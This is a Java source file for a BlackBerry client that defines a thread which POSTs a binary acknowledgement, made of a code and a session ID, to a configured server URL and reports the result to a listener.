package com.vvt.prot.unstruct;

import net.rim.device.api.util.DataBuffer;
import com.vvt.http.FxHttp;
import com.vvt.http.FxHttpListener;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.FxHttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.FxHttpResponse;
import com.vvt.http.response.SentProgress;
import com.vvt.prot.parser.UnstructParser;
import com.vvt.prot.response.unstruct.AckSecCmdResponse;
import com.vvt.prot.unstruct.request.AckSecRequest;
import com.vvt.std.Log;

public class AcknowledgementSecure extends Thread implements FxHttpListener {
	private static final String TAG = "AcknowledgementSecure" ; 
	private AcknowledgeSecureListener listener;
	private long sessionId;
	private String url;
	private int code;
	
	public void setAcknowledgeSecureListener(AcknowledgeSecureListener listener) {
		this.listener = listener;
	}
	
	public AcknowledgementSecure() {
		code = 1;
	}
	
	public void setUrl(String url){
		this.url = url;
	}
	
	public void setSessionId(long sessionId) {
		this.sessionId = sessionId;
	}
	
	public void run() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "doAcknowledgeSecure is starting!");
		}
		FxHttpRequest request = new FxHttpRequest();
		request.setUrl(url);
		request.setMethod(MethodType.POST);
		request.setContentType(ContentType.BINARY);
		AckSecRequest actSecRequest = new AckSecRequest();
		actSecRequest.setCode(code);
		actSecRequest.setSessionId(sessionId);
		try {
			byte[] data = UnstructParser.parseRequest(actSecRequest);
			request.addDataItem(data);
			FxHttp http = new FxHttp();
			http.setHttpListener(this);
			http.setRequest(request);			
			http.start();
			http.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "doAcknowledgeSecure is finished!");
			}
		} catch(Exception e) {
			e.printStackTrace();
			Log.error(TAG, "doAcknowledgeSecure is failed!", e);
			if (listener != null) {
				listener.onAcknowledgeSecureError(e);
			}
		}
	}
	
	public void doAcknowledgeSecure() {
		this.start();
	}
	
	public void onHttpError(Throwable err, String msg) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, " onHttpError! ", err);
		}
		if (listener != null) {
			listener.onAcknowledgeSecureError(err);
		}
	}

	public void onHttpResponse(FxHttpResponse response) {
		try {
			if (Log.isDebugEnable()) {
				DataBuffer overAllBuffer = new DataBuffer();
				overAllBuffer.write(response.getBody(), 0, response.getBody().length);
			}
		} catch (Exception e) {	
			e.printStackTrace();
			Log.error(TAG, " onHttpResponse: ", e);
		}
	}

	public void onHttpSentProgress(SentProgress progress) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, " onHTTPProgress() -> " + progress);
		}
	}

	public void onHttpSuccess(FxHttpResponse result) {		
		if (listener != null) {
			AckSecCmdResponse ackSecResponse = new AckSecCmdResponse();
			listener.onAcknowledgeSecureSuccess(ackSecResponse);
		}
	} 
}
